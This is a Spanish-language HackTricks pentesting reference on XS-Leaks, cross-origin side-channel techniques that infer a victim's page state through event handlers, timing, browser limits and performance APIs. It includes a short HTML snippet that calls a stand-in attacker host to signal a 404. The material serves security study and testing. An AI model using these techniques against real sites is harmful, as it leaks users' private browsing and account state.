# XS-Search/XS-Leaks

![](<../.gitbook/assets/image (9) (1) (2).png>)

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar f√°cilmente flujos de trabajo con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres que tu **empresa sea anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informaci√≥n b√°sica**

XS-Search es una t√©cnica orientada a **exfiltrar informaci√≥n de origen cruzado** abusando de ataques de **canal lateral**.

Hay diferentes elementos en este tipo de ataque:

* **Web vulnerable**: Es la web desde donde queremos exfiltrar alguna informaci√≥n.
* **Web del atacante**: Es la web que el atacante crea y que la v√≠ctima accede, y que contiene el exploit.
* **M√©todo de inclusi√≥n**: Es el m√©todo utilizado para cargar la web vulnerable desde la web del atacante (como window.open, iframe, fetch, etiqueta HTML con href...).
* **T√©cnica de filtraci√≥n**: Despu√©s de acceder a la web vulnerable, se utilizar√° una t√©cnica para diferenciar entre los posibles estados de la web con la informaci√≥n obtenida del m√©todo de inclusi√≥n utilizado.
* **Estados**: Los 2 posibles estados que puede tener la web vulnerable dependiendo de la v√≠ctima que queremos diferenciar.
* **Diferencias detectables**: Esta es la informaci√≥n que el atacante tiene que intentar decidir el estado de la web vulnerable.

### Diferencias detectables

Para distinguir entre los 2 estados de la p√°gina vulnerable, se pueden observar varias cosas:

* **C√≥digo de estado**. Un atacante puede distinguir **diferentes c√≥digos de estado de respuesta HTTP** de origen cruzado (por ejemplo, errores del servidor, errores del cliente o errores de autenticaci√≥n).
* **Uso de API**. Esta diferencia detectable permite a un atacante detectar el **uso de API web** en diferentes p√°ginas, lo que le permite inferir si una p√°gina de origen cruzado est√° utilizando una API web JavaScript espec√≠fica.
* **Redirecciones**. Es posible detectar si una aplicaci√≥n web ha **redirigido al usuario a una p√°gina diferente**. Esto no se limita a las redirecciones HTTP, sino que tambi√©n incluye redirecciones desencadenadas por JavaScript o HTML.
* **Contenido de la p√°gina**. Estas **diferencias detectables aparecen en el cuerpo de la respuesta HTTP** en s√≠ o en los subrecursos incluidos por la p√°gina. Por ejemplo, esto podr√≠a ser el **n√∫mero de frames incluidos** (cf. XS-Leak en Gitlab) o diferencias de tama√±o de im√°genes.
* **Encabezado HTTP**. Un atacante puede detectar la presencia de un **encabezado de respuesta HTTP espec√≠fico** y puede ser capaz de recopilar su valor. Esto incluye encabezados como X-Frame-Options, Content-Disposition y Cross-Origin-Resource-Policy.
* **Tiempo**: Un atacante puede detectar que existe una diferencia de tiempo consistente entre 2 estados.

### M√©todos de inclusi√≥n

* **Elementos HTML**. HTML ofrece una variedad de elementos que permiten la **inclusi√≥n de recursos de origen cruzado**. Elementos como hojas de estilo, im√°genes o scripts obligan al navegador de la v√≠ctima a solicitar un recurso no HTML especificado. Hay una lista que enumera los posibles elementos HTML para este prop√≥sito disponible en l√≠nea ([https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)).
* **Frames**. Elementos como **iframe**, **object** y **embed** pueden incrustar recursos HTML adicionales directamente en la p√°gina del atacante. Si la p√°gina no utiliza protecci√≥n de enmarcado, el c√≥digo JavaScript puede acceder al objeto window del recurso enmarcado a trav√©s de la propiedad contentWindow.
* **Ventanas emergentes**. El m√©todo **`window.open`** carga un recurso en una nueva pesta√±a o ventana del navegador. El m√©todo devuelve un **identificador de ventana** que el c√≥digo JavaScript puede usar para acceder a m√©todos y propiedades que cumplen con la SOP. Estas ventanas emergentes se utilizan a menudo en inicio de sesi√≥n √∫nico. Los navegadores modernos solo permiten ventanas emergentes si son desencadenadas por ciertas interacciones del usuario. Para los ataques de XS-Leak, este m√©todo es especialmente √∫til porque **evita las restricciones de enmarcado y cookies para un recurso objetivo**. Las versiones m√°s recientes de los navegadores recientemente agregaron medios para aislar los identificadores de ventana.
* **Solicitudes de JavaScript**. JavaScript permite enviar solicitudes directamente a recursos objetivo. Hay dos formas diferentes para este prop√≥sito: **XMLHttpRequests** y su sucesor **Fetch** **API**. A diferencia de los m√©todos de inclusi√≥n anteriores, un atacante tiene un control detallado sobre la solicitud emitida, por ejemplo, si se debe seguir autom√°ticamente una redirecci√≥n HTTP.
### T√©cnicas de filtraci√≥n

* **Manejador de eventos**. El manejador de eventos puede considerarse como la t√©cnica cl√°sica de filtraci√≥n para XS-Leaks. Son una fuente conocida de varias piezas de informaci√≥n. Por ejemplo, el desencadenante de **onload** indica una carga exitosa de recursos en contraste con el evento onerror.
* **Mensajes de error**. M√°s all√° de los manejadores de eventos, los mensajes de error pueden ocurrir como **excepciones de JavaScript** y **p√°ginas de error especiales**. Los mensajes de error pueden ser lanzados en diferentes pasos, por ejemplo, directamente por la t√©cnica de filtraci√≥n. La t√©cnica de filtraci√≥n puede usar **informaci√≥n adicional** contenida directamente en el mensaje de error, o distinguir entre la **aparici√≥n y ausencia de un mensaje de error**.
* **L√≠mites globales**. Cada computadora tiene sus l√≠mites f√≠sicos, al igual que un navegador. Por ejemplo, la cantidad de memoria disponible limita las pesta√±as en ejecuci√≥n de un navegador. Lo mismo ocurre con otros l√≠mites del navegador que se aplican a todo el navegador. Si un atacante puede determinar **cu√°ndo se alcanza el l√≠mite, esto puede usarse como una t√©cnica de filtraci√≥n**.
* **Estado global**. Los navegadores tienen **estados globales con los que todas las p√°ginas pueden interactuar**. Si esta interacci√≥n es detectable desde el sitio web de un atacante, puede usarse como una t√©cnica de filtraci√≥n. Por ejemplo, la interfaz **History** permite la manipulaci√≥n de las p√°ginas visitadas en una pesta√±a o marco. Esto crea un estado global porque el **n√∫mero de entradas** permite a un atacante sacar conclusiones sobre las p√°ginas de origen cruzado.
* **API de rendimiento**. La API de rendimiento se utiliza para acceder a la **informaci√≥n de rendimiento de la p√°gina actual**. Sus entradas incluyen datos detallados de temporizaci√≥n de red para el documento y cada recurso cargado por la p√°gina. Esto permite a un atacante sacar **conclusiones sobre los recursos solicitados**. Por ejemplo, identificamos casos en los que los navegadores no crear√°n entradas de rendimiento para algunas solicitudes.
* **Atributos legibles**. HTML tiene varios **atributos que se pueden leer de origen cruzado**. Este acceso de lectura se puede utilizar como una t√©cnica de filtraci√≥n. Por ejemplo, el c√≥digo JavaScript puede leer el n√∫mero de marcos incluidos en una p√°gina web de origen cruzado con la propiedad window.frame.length.

#### **T√©cnicas basadas en tiempo**

Algunas de las siguientes t√©cnicas van a utilizar el tiempo como parte del proceso para detectar diferencias en los posibles estados de las p√°ginas web. Hay diferentes formas de medir el tiempo en un navegador web.

**Relojes**: La API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite a los desarrolladores obtener mediciones de tiempo de alta resoluci√≥n.\
Hay una cantidad considerable de API que los atacantes pueden abusar para crear relojes impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animaciones CSS y otros.\
Para m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## XSinator

XSinator es una herramienta autom√°tica para **verificar navegadores contra varias filtraciones XS-Leaks** explicadas en su documento: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)\
Puedes acceder a la herramienta en [https://xsinator.com/](https://xsinator.com/)

{% hint style="warning" %}
**Filtraciones XS excluidas**: Tuvimos que excluir filtraciones XS que dependen de **service workers** ya que interferir√≠an con otras filtraciones en XSinator. Adem√°s, elegimos **excluir filtraciones XS que dependen de una configuraci√≥n incorrecta y errores en una aplicaci√≥n web espec√≠fica**. Por ejemplo, configuraciones incorrectas de Cross-Origin Resource Sharing (CORS), filtraciones de postMessage o Cross-Site Scripting. Adem√°s, excluimos filtraciones XS basadas en tiempo ya que a menudo sufren de ser lentas, ruidosas e inexactas.
{% endhint %}

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** impulsados por las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de manejador de eventos

### Onload/Onerror

* **M√©todos de inclusi√≥n**: Marcos, elementos HTML
* **Diferencia detectable**: C√≥digo de estado
* **M√°s informaci√≥n**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumen**: si se intenta cargar un recurso, los eventos onerror/onload se desencadenan cuando el recurso se carga exitosamente/no exitosamente, lo que permite determinar el c√≥digo de estado.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

El ejemplo de c√≥digo intenta **cargar objetos de scripts desde JS**, pero tambi√©n se pueden usar **otros tags** como objetos, hojas de estilo, im√°genes, audios. Adem√°s, tambi√©n es posible inyectar directamente la **etiqueta** y declarar los eventos `onload` y `onerror` dentro de la etiqueta (en lugar de inyectarla desde JS).

Tambi√©n hay una versi√≥n sin script de este ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
En este caso, si `example.com/404` no se encuentra, se cargar√° `attacker.com/?error`.

### Tiempo de carga

* **M√©todos de inclusi√≥n**: Elementos HTML
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumen**: La API **performance.now()** se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Sin embargo, tambi√©n se pueden utilizar otros relojes, como la API **PerformanceLongTaskTiming**, que puede identificar tareas que se ejecutan durante m√°s de 50 ms.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) otro ejemplo en:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tiempo de carga + Tarea pesada forzada

Esta t√©cnica es similar a la anterior, pero el **atacante** tambi√©n **forzar√°** alguna acci√≥n para que tome un **tiempo relevante** cuando la **respuesta sea positiva o negativa** y medir√° ese tiempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tiempo de descarga/cierre de ventana

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumen**: El reloj [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Tambi√©n se pueden utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Los eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) y [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) se pueden utilizar para medir el tiempo que tarda en obtener un recurso. Esto funciona porque **`beforeunload`** se activa cuando el navegador realiza una nueva solicitud de navegaci√≥n, mientras que **`unload`** se activa cuando esa navegaci√≥n realmente ocurre. Debido a este comportamiento, es posible calcular la diferencia de tiempo entre estos dos eventos y medir el tiempo que tard√≥ el navegador en completar la obtenci√≥n del recurso.

### Tiempo de marco con restricciones + carga

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumen**: La API **performance.now()** se puede utilizar para medir cu√°nto tiempo se tarda en realizar una solicitud. Tambi√©n se pueden utilizar otros relojes.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Si una p√°gina no tiene implementadas [Protecciones de enmarcado](https://xsleaks.dev/docs/defenses/opt-in/xfo/), un atacante puede medir cu√°nto tiempo tarda en cargarse la p√°gina y todos los recursos secundarios a trav√©s de la red. Por defecto, el controlador `onload` de un iframe se invoca despu√©s de que se hayan cargado todos los recursos y se haya completado la ejecuci√≥n de JavaScript. Sin embargo, un atacante puede eliminar el ruido de la ejecuci√≥n de scripts incluyendo el atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) en el `<iframe>`. Este atributo bloquea muchas funciones, incluida la ejecuci√≥n de JavaScript, lo que resulta en una medici√≥n casi pura de la red.

### #ID + error + onload

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**:
* **Resumen**: Si puedes hacer que la p√°gina genere un error cuando se accede al contenido correcto y hacer que se cargue correctamente cuando se accede a cualquier contenido, entonces puedes hacer un bucle para extraer toda la informaci√≥n sin medir el tiempo.
* **Ejemplo de c√≥digo**:

Supongamos que puedes **insertar** la **p√°gina** que tiene el **contenido secreto** dentro de un iframe.

Puedes hacer que la v√≠ctima busque el archivo que contiene "_**flag**_" utilizando un iframe (explotando un CSRF, por ejemplo). Dentro del iframe, sabes que el evento _**onload**_ se ejecutar√° siempre al menos una vez. Luego, puedes **cambiar** la **URL** del iframe cambiando solo el **contenido** del **hash** dentro de la URL.

Por ejemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la primera URL se **carg√≥ correctamente**, entonces, al **cambiar** la parte del **hash** de la URL, el evento **onload** no se **activar√° nuevamente**. Pero si la p√°gina tuvo alg√∫n tipo de **error** al **cargarse**, entonces el evento **onload** se **activar√° nuevamente**.

De esta manera, puedes distinguir entre una p√°gina cargada **correctamente** o una p√°gina que tiene un **error** al ser accedida.

### Ejecuci√≥n de JavaScript

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**:
* **Resumen**: Si la **p√°gina** devuelve el contenido **sensible**, o un contenido que puede ser controlado por el usuario. El usuario podr√≠a establecer un **c√≥digo JS v√°lido en el caso negativo**, y cargar cada intento dentro de etiquetas **`<script>`**, de modo que en los casos **negativos** se ejecute el **c√≥digo** del atacante, y en los casos **afirmativos** no se ejecute **nada**.
* **Ejemplo de c√≥digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}
### CORB - Onerror

* **M√©todos de inclusi√≥n**: Elementos HTML
* **Diferencia detectable**: C√≥digo de estado y encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumen**: Los atacantes pueden observar cuando se aplica CORB si una respuesta devuelve un `Content-Type` protegido por CORB (y `nosniff`) con el c√≥digo de estado `2xx`, lo que resulta en que CORB elimine el cuerpo y los encabezados de la respuesta. Detectar esta protecci√≥n permite a un atacante **filtrar** la combinaci√≥n tanto del **c√≥digo de estado** (√©xito vs. error) como del **`Content-Type` (protegido por CORB o no).**
* **Ejemplo de c√≥digo**:

Consulte el enlace de m√°s informaci√≥n para obtener m√°s informaci√≥n sobre el ataque.

### onblur

* **M√©todos de inclusi√≥n**: Marcos
* **Diferencia detectable**: Contenido de la p√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumen**: Filtrar datos confidenciales del atributo id o name.
* **Ejemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es posible **cargar una p√°gina** dentro de un **iframe** y usar el **`#id_value`** para hacer que la p√°gina se **enfoque en el elemento** del iframe indicado, luego, si se activa una se√±al **`onblur`**, el elemento ID existe.\
Puedes realizar el mismo ataque con etiquetas **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M√©todos de inclusi√≥n**: Marcos, Ventanas emergentes
* **Diferencia detectable**: Uso de la API
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumen**: Recopilar informaci√≥n confidencial de un postMessage o utilizar la presencia de postMessages como un or√°culo para conocer el estado del usuario en la p√°gina.
* **Ejemplo de c√≥digo**: `Cualquier c√≥digo que escuche todos los postMessages.`

Las aplicaciones a menudo utilizan [postMessage broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para compartir informaci√≥n con otros or√≠genes. Al escuchar estos mensajes, uno podr√≠a encontrar **informaci√≥n confidencial** (potencialmente si no se utiliza el par√°metro `targetOrigin`). Adem√°s, el hecho de recibir alg√∫n mensaje puede ser **utilizado como un or√°culo** (solo recibes este tipo de mensaje si has iniciado sesi√≥n).

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de l√≠mites globales

### WebSocket API

* **M√©todos de inclusi√≥n**: Marcos, Ventanas emergentes
* **Diferencia detectable**: Uso de la API
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumen**: Agotar el l√≠mite de conexiones WebSocket filtra el n√∫mero de conexiones WebSocket de una p√°gina de origen cruzado.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Es posible identificar si, y cu√°ntas, **conexiones WebSocket utiliza una p√°gina objetivo**. Esto permite a un atacante detectar estados de aplicaci√≥n y filtrar informaci√≥n relacionada con el n√∫mero de conexiones WebSocket.

Si un **origen** utiliza la **cantidad m√°xima de objetos de conexi√≥n WebSocket**, independientemente de su estado de conexi√≥n, la creaci√≥n de **nuevos objetos resultar√° en excepciones de JavaScript**. Para ejecutar este ataque, el sitio web del atacante abre el sitio web objetivo en una ventana emergente o iframe y luego, despu√©s de que se haya cargado el sitio web objetivo, intenta crear el n√∫mero m√°ximo de conexiones WebSocket posibles. El **n√∫mero de excepciones lanzadas** es el **n√∫mero de conexiones WebSocket utilizadas por la ventana del sitio web objetivo**.

### Payment API

* **M√©todos de inclusi√≥n**: Marcos, Ventanas emergentes
* **Diferencia detectable**: Uso de la API
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumen**: Detectar la solicitud de pago porque solo puede haber una activa a la vez.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Esta XS-Leak permite a un atacante **detectar cu√°ndo una p√°gina de origen cruzado inicia una solicitud de pago**.

Debido a que **solo puede haber una solicitud de pago activa** al mismo tiempo, si el sitio web objetivo est√° utilizando la API de solicitud de pago, cualquier **intento posterior de mostrar esta API fallar√°** y provocar√° una **excepci√≥n de JavaScript**. El atacante puede aprovechar esto **intentando peri√≥dicamente mostrar la interfaz de la API de pago**. Si un intento provoca una excepci√≥n, significa que el sitio web objetivo la est√° utilizando. El atacante puede ocultar estos intentos peri√≥dicos cerrando inmediatamente la interfaz despu√©s de crearla.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M√©todos de inclusi√≥n**:
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Resumen**: Medir el tiempo de ejecuci√≥n de una web abusando del bucle de eventos de JavaScript de un solo hilo.
* **Ejemplo de c√≥digo**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

El modelo de concurrencia de JavaScript se basa en un [bucle de eventos de un solo hilo](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), lo que significa que **solo puede ejecutar una tarea a la vez**.\
Inferir **cu√°nto tiempo tarda en ejecutarse el c√≥digo de un origen diferente** midiendo cu√°nto tiempo tarda en ejecutarse el siguiente en el grupo de eventos. El atacante sigue enviando eventos al bucle de eventos con propiedades fijas, que eventualmente se despachar√°n si el grupo est√° vac√≠o. Otros or√≠genes despachan eventos al mismo grupo, y aqu√≠ es donde un **atacante infiere la diferencia de tiempo al detectar si ocurri√≥ un retraso con una de sus tareas**.

{% hint style="warning" %}
En una medici√≥n de tiempo de ejecuci√≥n, es posible **eliminar** los **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}
### Bucle de Eventos Ocupado <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©todos de Inclusi√≥n**:
* **Diferencia Detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumen**: Mide el tiempo de ejecuci√≥n de una web bloqueando el bucle de eventos de un hilo y cronometrando **cu√°nto tiempo tarda en estar disponible nuevamente el bucle de eventos**.
* **Ejemplo de c√≥digo**:

Una de las principales ventajas de esta t√©cnica es su capacidad para eludir el Aislamiento del Sitio, ya que un origen atacante puede influir en la ejecuci√≥n de otro origen.

{% hint style="warning" %}
En una medici√≥n de tiempo de ejecuci√≥n, es posible **eliminar** los **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Pool de Conexiones

* **M√©todos de Inclusi√≥n**: Solicitudes JavaScript
* **Diferencia Detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Resumen**: Un atacante podr√≠a bloquear todos los sockets excepto uno, cargar la p√°gina objetivo y al mismo tiempo cargar otra p√°gina, el tiempo hasta que la √∫ltima p√°gina comienza a cargarse es el tiempo que la p√°gina objetivo tard√≥ en cargarse.
* **Ejemplo de c√≥digo**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Los navegadores utilizan sockets para comunicarse con los servidores. Como el sistema operativo y el hardware en el que se ejecuta tienen recursos limitados, **los navegadores tienen que imponer un l√≠mite**. Para explotar la existencia de este l√≠mite, los atacantes pueden:

1. Verificar cu√°l es el l√≠mite del navegador, por ejemplo, 256 sockets globales.
2. Bloquear 255 sockets durante un largo per√≠odo de tiempo realizando 255 solicitudes a diferentes hosts que simplemente cuelgan la conexi√≥n.
3. Utilizar el socket 256 realizando una solicitud a la p√°gina objetivo.
4. Realizar una solicitud 257 a otro host. Dado que todos los sockets est√°n siendo utilizados (en los pasos 2 y 3), esta solicitud debe esperar hasta que el pool reciba un socket disponible. Este per√≠odo de espera proporciona al atacante el tiempo de sincronizaci√≥n de red del socket 256, que pertenece a la p√°gina objetivo. Esto funciona porque los 255 sockets en el paso 2 todav√≠a est√°n bloqueados, por lo que si el pool recibi√≥ un socket disponible, fue causado por la liberaci√≥n del socket en el paso 3. El tiempo de liberaci√≥n del socket 256 est√° directamente relacionado con el tiempo que tarda en completarse la solicitud.

Para obtener m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de Conexiones por Destino

* **M√©todos de Inclusi√≥n**: Solicitudes JavaScript
* **Diferencia Detectable**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **M√°s informaci√≥n**:
* **Resumen**: Es como la t√©cnica anterior, pero en lugar de utilizar todos los sockets, Google **Chrome** establece un l√≠mite de **6 solicitudes simult√°neas al mismo origen**. Si **bloqueamos 5** y luego **lanzamos una sexta** solicitud, podemos **cronometrarla** y si logramos hacer que la p√°gina **v√≠ctima env√≠e** m√°s **solicitudes** al mismo punto final para detectar un **estado** de la **p√°gina**, la **sexta solicitud** tardar√° **m√°s tiempo** y podremos detectarlo.

##

![](<../.gitbook/assets/image (9) (1) (2).png>)

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T√©cnicas de la API de Rendimiento

La [`API de Rendimiento`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) proporciona acceso a informaci√≥n relacionada con el rendimiento mejorada por los datos de la [`API de Tiempo de Recursos`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API), que proporciona los tiempos de las solicitudes de red, como la duraci√≥n, pero cuando el servidor env√≠a una cabecera `Timing-Allow-Origin: *`, tambi√©n se proporciona el tama√±o de transferencia y el tiempo de b√∫squeda de dominio.\
Estos datos se pueden acceder utilizando [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) o [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName). Tambi√©n se puede utilizar para obtener el tiempo de ejecuci√≥n utilizando la diferencia de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now), sin embargo, esto parece ser menos preciso para una solicitud de Chrome porque solo proporciona los milisegundos.

